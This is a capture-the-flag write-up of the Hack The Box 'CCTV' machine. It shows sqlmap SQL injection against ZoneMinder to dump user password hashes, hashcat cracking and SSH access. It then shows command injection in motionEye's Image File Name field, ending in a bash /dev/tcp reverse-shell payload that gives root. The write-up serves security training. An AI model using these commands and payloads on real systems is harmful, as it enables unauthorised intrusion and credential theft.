---
title: "CCTV - HTB Writeup"
description: "This writeup documents the exploitation of the CCTV machine from Hack The Box — Season 10."
locale: en
publishDate: 2026-03-14
draft: false
featured: false
tags: ["htb", "sqlmap", "hashcat", "zoneminder", "motioneye"]
author: "dexter"
category: htb
platform: "Hack The Box"
difficulty: easy
toc: true
image: /cctv/cctv.jpeg
---

This writeup documents the exploitation of the **CCTV** machine from **Hack The Box — Season 10**.
Grab a coffee ☕ and let's dive in.

![CCTV machine banner](/cctv/cctv-banner.png)

## Reconnaissance & Port Scanning

To begin the reconnaissance phase, I first added the target machine's IP address to my local **/etc/hosts** file in order to resolve the hostname easily during testing.

```bash
$ echo "10.129.253.45 cctv.htb" | sudo tee -a /etc/hosts
```

After that, I performed a port scan using **Nmap** to identify open ports and running services on the target machine.

```bash
$ nmap -sV -A cctv.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http    Apache httpd 2.4.58
```

## Web Enumeration

After identifying that **port 80** was open from the **Nmap** scan, I navigated to the web application in the browser.

The website appeared to be a landing page for a security company called **SecureVision**, offering CCTV monitoring and other security services.

At the top right corner, I noticed a **"Staff Login"** button, which led to a login page. Since no credentials were provided, I decided to try some common **default credentials**.

**Surprisingly**, the credentials:

```text
admin : admin
```

worked immediately and granted access to the dashboard.

![Logging into the ZoneMinder dashboard with the default admin credentials](/cctv/cctv-zoneminder-login.gif)

After logging in, I was redirected to the **ZoneMinder dashboard**, which is an open-source CCTV surveillance platform.

While exploring the interface, I noticed the **ZoneMinder version displayed in the top right corner**, which was:

```text
v1.37.63
```

Since the version number was visible, I decided to search online to see if there were any known issues related to this release. During my research, I came across a security advisory discussing a vulnerability affecting the same **ZoneMinder version on** [**GitHub**](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)**.**

The advisory described a vulnerability in the **request endpoint**, which could potentially be abused for **SQL injection**. This indicated that the application might be vulnerable and worth further testing.

After finding the advisory mentioning a possible SQL injection in the **request endpoint**, I decided to test it manually.

The vulnerable endpoint mentioned in the advisory was:

```text
/zm/index.php?view=request&request=event&action=removetag&tid=1
```

To verify whether the parameter was injectable, I initially attempted to use **sqlmap** directly against the URL:

```bash
$ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" -p tid
```

However, the request returned a **401 Unauthorized** response, which indicated that authentication was required in order to access the endpoint.

To handle this properly, I captured the full authenticated request using the browser's network tab and saved it into a file called `req.txt`.

```bash
$ cat req.txt
```

```http
GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1
Host: cctv.htb
User-Agent: Mozilla/5.0
Referer: http://cctv.htb/zm/
Cookie: zmSkin=classic; zmCSS=base; ZMSESSID=i4fodqn5rvo4nlsaqi3o1iujgr
Connection: close
```

After saving the request, I used **sqlmap** with the `-r` option to replay the exact HTTP request including the authentication cookies.

```bash
$ sqlmap -r req.txt -p tid --batch --technique=T
```

Sqlmap successfully detected that the **tid parameter was vulnerable to SQL injection**.

After confirming that the **tid parameter** was vulnerable to SQL injection, I began enumerating the database using **sqlmap**.

First, I listed the available databases:

```bash
$ sqlmap -r req.txt -p tid --batch --technique=T --dbs
```

Among the discovered databases was the **zm** database, which is used by the ZoneMinder application.

Next, I listed the tables inside the `zm` database:

```bash
$ sqlmap -r req.txt -p tid --batch --technique=T -D zm --tables
```

The output revealed several tables, including a **Users** table that likely contained authentication data.

To extract the contents of this table, I used the following command:

```bash
$ sqlmap -r req.txt -p "tid" --batch --technique=T --dump -D zm -T Users
```

This allowed me to dump all records from the **Users** table, revealing usernames and password hashes stored by the application.

The output revealed several users along with their password hashes:

```text
+----+---------+---------+---------+---------+---------+---------+----------+----------+--------------------------------------------------------------+------------+----------+----------+----------+----------+-----------+------------+------------+--------------+----------------+
| Id | Email   | Phone   | Name    | Control | Devices | Enabled | HomeView | Monitors | Password                                                     | Username   | Events   | Groups   | Stream   | System   | Snapshots | APIEnabled | Language   | MaxBandwidth | TokenMinExpiry |
+----+---------+---------+---------+---------+---------+---------+----------+----------+--------------------------------------------------------------+------------+----------+----------+----------+----------+-----------+------------+------------+--------------+----------------+
| 1  | <blank> | <blank> | <blank> | Edit    | Edit    | 1       | console  | Create   | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm | superadmin | Edit     | Edit     | View     | Edit     | Edit      | 1          | <blank>    | <blank>      | 0              |
| 2  | <blank> | <blank> | mark    | Edit    | Edit    | 1       | console  | Create   | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. | mark       | Edit     | Edit     | View     | View     | <blank>   | 1          | <blank>    | <blank>      | 0              |
| 3  | <blank> | <blank> | admin   | Edit    | Edit    | 1       | console  | Create   | $2y$10$t5z8uIT.n9uCdHCidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m | admin      | Edit     | Edit     | View     | View     | <blank>   | 1          | <blank>    | <blank>      | 0              |
+----+---------+---------+---------+---------+---------+---------+----------+----------+--------------------------------------------------------------+------------+----------+----------+----------+----------+-----------+------------+------------+--------------+----------------+
```

From this output, several usernames were identified, including **superadmin**, **mark**, and **admin**, along with their corresponding **bcrypt password hashes**.

After extracting the password hashes from the **Users** table, I attempted to crack them offline.

The hashes appeared to be **bcrypt hashes**, so I copied them into a file called `hash.txt`.

I first attempted to crack the hash belonging to the **superadmin** user, but it did not crack using the available wordlists.

Next, I tried cracking the hash for the **mark** user using **hashcat** with the rockyou wordlist.

```bash
$ hashcat -m 3200 hash.txt rockyou.txt
```

After some time, hashcat successfully recovered the password for the **mark** account:

```text
mark : [**********]
```

Using these credentials, I was able to authenticate as the **mark** user on the system and continue the exploitation process.

## SSH Access

After successfully cracking the password hash for the **mark** user, I attempted to authenticate to the system via **SSH** using the recovered credentials.

```bash
$ ssh mark@cctv.htb
```

After entering the cracked password, the login was successful and I obtained a shell on the machine as the **mark** user.

After logging into the system as the **mark** user, I started exploring the filesystem.

First, I listed the contents of the current directory:

```bash
$ ls
```

However, I did not find the **user flag** there. This suggested that the flag might belong to another user.

I navigated one directory up and listed the available home directories:

```bash
$ ls /home
```

The output revealed two users:

```text
mark
sa_mark
```

I attempted to access the `sa_mark` directory to check if the user flag was located there.

```bash
$ cd /home/sa_mark
```

However, access was denied due to insufficient permissions.

Since the **mark** user did not have permission to access the `sa_mark` directory, I concluded that a **privilege escalation** would be required in order to retrieve the flag.

## Privilege Escalation

Since I could not access the `sa_mark` directory, I began looking for possible **privilege escalation vectors**.

First, I checked whether the current user had any sudo privileges:

```bash
$ sudo -l
```

The output indicated that the **mark** user was not allowed to run any commands with sudo.

Next, I searched for **SUID binaries** that might be exploitable:

```bash
$ find / -perm -4000 2>/dev/null
```

However, none of the discovered binaries appeared to be useful for privilege escalation.

During the enumeration process, I decided to inspect the `/tmp` directory to see if there were any interesting files or application artifacts.

```bash
$ cd /tmp
$ ls
```

The directory contained several temporary system folders, but one entry immediately caught my attention:

```text
MotionEye
```

Since **motionEye** is a web-based surveillance management interface often used with CCTV systems, I decided to investigate further to understand how it was configured on the system.

While searching through the filesystem, I located the configuration directory for motionEye:

```bash
$ cd /etc/motioneye
$ ls
```

The directory contained the following configuration files:

```text
camera-1.conf
motion.conf
motioneye.conf
```

Inspecting the `motioneye.conf` file revealed that the service was configured to listen on **localhost port 8765**.

```text
listen 127.0.0.1
port 8765
```

This indicated that a **motionEye web interface** was running locally on the machine but was not exposed externally.

At this point, it became clear that the service could potentially be accessed locally and might provide another attack surface for privilege escalation.

To interact with the web interface, I decided to create an **SSH tunnel** that would forward the remote port to my local machine.

I established the tunnel using the following command:

```bash
$ ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

This forwarded the remote port **8765** to my local system, allowing me to access the motionEye interface through my browser.

After setting up the tunnel, I navigated to:

```text
http://localhost:8765
```

After establishing the SSH tunnel, I navigated to the motionEye interface in my browser:

```text
http://localhost:8765
```

This opened the **motionEye login page**.

Since motionEye often ships with default credentials, I first tried the commonly known default login:

```text
username: admin
password: (blank)
```

However, this did not work and access was denied.

Remembering that I had previously discovered configuration files related to motionEye on the system, I went back to the target machine and inspected them more carefully. Inside `/etc/motioneye/motion.conf`, I found the following entries:

```bash
# @admin_username admin
# @admin_password [****************************************]
```

The password appeared to be stored as a **SHA1 hash**. I initially attempted to crack the hash offline using common wordlists, but none of the attempts were successful.

Out of curiosity, I tried using the **hash itself as the password** when logging into the motionEye interface.

Surprisingly, this worked, and I was successfully authenticated into the **motionEye dashboard** as the admin user.

![Logging into the motionEye dashboard using the hash as the password](/cctv/cctv-motioneye-login.gif)

After successfully logging into the **motionEye dashboard**, I started exploring the available settings. By opening the menu in the top-left corner and navigating through the configuration options, I found detailed information about the running software.

![motionEye version information](/cctv/cctv-motioneye-about.jpeg)

The interface revealed the following versions:

```text
motionEye Version 0.43.1b4
Motion Version 4.7.1
OS Version Ubuntu 24.04
```

Since the exact version of **motionEye** was visible, I decided to search for known vulnerabilities affecting this release. During my research, I found a repository describing a **command injection vulnerability** in motionEye:

[**See this repository on github for detailed explanation.**](https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter)

The repository explained that the web interface performs **client-side validation** on certain configuration parameters. However, this validation can be bypassed by overriding the validation function directly from the browser console.

Using the browser developer tools, I opened the console and replaced the validation function with the following code:

```javascript
configUiValid = function() {
    return true;
};
```

This effectively disabled the client-side validation checks and allowed arbitrary input to be submitted to the application.

To verify that command injection was possible, I inserted the following payload inside the **Image File Name** field:

```bash
$(touch /tmp/test).%Y-%m-%d-%H-%M-%S
```

After applying the configuration, I checked the `/tmp` directory on the target machine and confirmed that the file had been created successfully. This proved that command execution was possible on the system.

![The /tmp/test file created on the target](/cctv/cctv-rce-test.jpeg)

With command injection confirmed, I proceeded to obtain a reverse shell by injecting the following payload:

```bash
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1\"')")
```

Before triggering the payload, I started a listener on my machine:

```bash
$ nc -lvnp 4444
```

Once the payload was executed, a reverse shell was received, granting me **root access** on the target system.

After that, I verified the access level and got the flags:

![Root access and the flags](/cctv/cctv-flags.jpeg)

Thanks for taking the time to read this writeup. I hope you found it helpful and interesting.

If you have any questions or feedback, feel free to reach out on [LinkedIn](http://www.linkedin.com/in/ahmed-gamal-ag113), [Facebook](https://www.facebook.com/ahmedg113/) or [GitHub](https://github.com/d3xter0).

![Thank you for reading](/cctv/cctv-thanks.gif)
